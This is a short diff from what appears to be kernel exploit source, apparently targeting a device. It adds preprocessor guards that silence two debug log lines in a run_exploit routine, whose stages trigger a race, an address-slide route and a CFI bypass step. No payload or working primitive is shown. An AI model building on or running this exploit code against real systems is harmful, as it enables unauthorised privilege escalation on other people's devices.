@@ -571,8 +571,10 @@ int run_exploit(int argc, char **argv) {
     }
     int triggered = app_trigger_fops_slide_route();
 #if defined(APP_PHYS_VIRTUAL_BASE_ORACLE) && APP_PHYS_VIRTUAL_BASE_ORACLE
+#if !defined(APP_S928_STABLE_RACE) || !APP_S928_STABLE_RACE
     pr_info("app fops stage=trigger-return attempt=%d triggered=%d\n",
             attempt, triggered);
+#endif
 #endif
     int verified = 0;
 #if defined(APP_FOPS_DEFER_ALIAS_READBACK) && \
@@ -625,8 +627,10 @@ int run_exploit(int argc, char **argv) {
   start_p0_ref_keeper();
   for (int attempt = 1; attempt <= 1; attempt++) {
     int triggered = app_trigger_fops_slide_route();
+#if !defined(APP_S928_STABLE_RACE) || !APP_S928_STABLE_RACE
     pr_info("app fops stage=trigger-return attempt=%d triggered=%d\n",
             attempt, triggered);
+#endif
     int verified = triggered && try_cfi_stage();
     pr_info("app fops slide attempt=%d/1 triggered=%d verified=%d "
             "step=%d errno=%d\n",
